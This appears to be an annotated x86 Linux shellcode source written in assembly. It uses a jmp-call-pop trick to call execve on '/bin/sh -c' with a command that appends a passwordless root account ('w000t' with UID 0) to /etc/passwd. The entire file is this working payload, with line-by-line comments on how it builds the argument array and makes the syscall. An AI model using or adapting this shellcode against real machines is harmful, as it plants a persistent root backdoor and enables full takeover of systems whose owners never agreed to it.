global _start
section .text
_start:
  jmp short jmp2call        ; jump2call so we can get the string location on the stack.
string2stack:
  pop esi                   ; pop memory location of string "/bin/sh#-c#/bin/echo.." into esi
  xor eax, eax              ; clear out eax register
  mov byte [esi +7], al     ; Null byte to terminate string "/bin/sh"
  mov byte [esi +10], al    ; Null byte to terminate string "-c"
  mov byte [esi +71], al    ; Null byte to terminate string
                            ; "/bin/echo w000t::0:0:s4fem0de:/root:/bin/bash >> /etc/passwd"
  mov dword [esi +73], esi  ; argv[] array start. Memory pointer to string "/bin/sh"
  lea ebx, [esi +8]         ; move pointer to string "-c" into ebx register
  mov dword [esi +77], ebx  ; argv[] 2nd arg. Memory location of "-c" anfter first string,
  lea ebx, [esi +11]        ; move pointer to string "/bin/echo..." into ebx register
  mov dword [esi +81], ebx  ; argv[] 3rd arg. Mem location to "/bin/echo.." string
  mov dword [esi +85], eax  ; argv[] Null dword terminator.
  mov al, 0xb               ; 11 - syscall for execve
  mov ebx, esi              ; location of string "/bin/sh" for program filename
  lea ecx, [esi +73]        ; argv pointers to args
  lea edx, [esi +85]        ; fill edx with null dword
  int 0x80                  ; executes execve systemcall
jmp2call:
  call string2stack         ; jumps 2 next instruction and pushes memory location of string
                            ; below onto the stack.
  string db "/bin/sh#-c#/bin/echo w000t::0:0:s4fem0de:/root:/bin/bash >> /etc/passwd#AAAABBBBCCCCDDDD"
;            0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567
;                      1         2         3         4         5         6         7         8
